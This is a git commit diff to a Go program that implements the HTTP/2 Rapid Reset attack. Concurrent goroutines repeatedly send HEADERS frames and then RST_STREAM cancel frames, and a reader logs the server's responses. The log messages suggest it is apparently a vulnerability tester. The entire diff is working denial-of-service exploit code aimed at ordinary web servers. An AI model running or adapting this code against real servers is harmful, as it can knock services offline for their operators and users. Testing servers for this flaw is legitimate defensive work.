b94481cf1f977d73eafa2c078c1ce80702bbe183
Andreas Schmidt <andreas.schmidt@gammacommunications.de>
2023-11-10 21:41:49 +0100

    feat: update frame reading logic

--- main.go
+++ main.go
@@ -94,23 +94,16 @@ func main() {
 		var streamCounter uint32 = 1 //according to https://datatracker.ietf.org/doc/html/rfc9113#name-stream-identifiers, stream IDs MUST be uneven for client-initiated requests
 		for i := 0; i < *routines; i++ {
 			streamFramer := http2.NewFramer(conn, conn) //a framer may only be used by a single reader/writer
-			go attack(streamFramer, serverUrl, *attempts, streamCounter)
+			go attack(streamFramer, serverUrl, *attempts, streamCounter, sleep)
 			streamCounter += 2
 		}
-		attack(framer, serverUrl, *attempts, streamCounter)
+		readFrames(conn)
 		conn.Close()
 	}
 }
 
-func attack(framer *http2.Framer, url *url.URL, attempts uint, streamCounter uint32) {
-	
-	err := framer.WriteHeaders(createHeaderFrameParam(url, streamCounter))
-	if err != nil {
-		log.Fatalf("unable to send initial HEADERS frame")
-	}
-	log.Printf("sent initial headers")
-
-	var i uint = 0
+func readFrames(conn *tls.Conn) {
+	framer := http2.NewFramer(conn, conn)
 	for {
 		frame, err := framer.ReadFrame()
 		if err != nil {
@@ -119,30 +112,32 @@ func attack(framer *http2.Framer, url *url.URL, attempts uint, streamCounter uin
 		log.Printf("found new frame headers: %v", frame.Header())
 		
 		if frame.Header().Type == http2.FrameHeaders {
-			i++
-			if i > attempts {
-				break
-			}
-
-			log.Println("received HEADERS, now sending RST Frame...")
-		
-			time.Sleep(time.Millisecond * time.Duration(*sleep))
-			
-			err = framer.WriteRSTStream(streamCounter, http2.ErrCodeCancel)
-			if err != nil {
-				log.Fatalf("failed sending RST STREAM frame: %v", err)
-			}
-
-			log.Println("wrote RST STREAM frame")
-			err = framer.WriteHeaders(createHeaderFrameParam(url, streamCounter))
-			if err != nil {
-				log.Fatalf("error sending new HEADERS frame: %v", err)
-			}
-
-			log.Println("wrote new HEADERS frame to start a new request...")
+			log.Printf("found new HEADERS frame %v, the server is likely responding to a new request.", frame.(*http2.HeadersFrame))
 		} else if frame.Header().Type == http2.FrameGoAway && !*ignoreGoAway {
-			log.Printf("received GOAWAY. It seems like the server responded correctly.")
+			gframe := frame.(*http2.GoAwayFrame)
+			log.Printf("received GOAWAY %v. It seems like the server responded correctly.", gframe)
 			break
+		} else {
+			log.Printf("got new frame %v", frame)
 		}
+	}
+}
+
+func attack(framer *http2.Framer, url *url.URL, attempts uint, streamCounter uint32, sleepTime *int) {
+	for i := uint(0); i < attempts; i++ {
+		err := framer.WriteHeaders(createHeaderFrameParam(url, streamCounter))
+		if err != nil {
+			log.Fatalf("unable to send initial HEADERS frame")
+		}
+		log.Printf("sent initial headers")
+		
+		log.Printf("now sleeping for %d milliseconds", *sleepTime)
+		time.Sleep(time.Millisecond * time.Duration(*sleepTime))
+
+		err = framer.WriteRSTStream(streamCounter, http2.ErrCodeCancel)
+		if err != nil {
+			log.Fatalf("unable to write RST_STREAM frame: %v", err)
+		}
+		log.Print("Wrote RST_STREAM frame")
 	}
 }
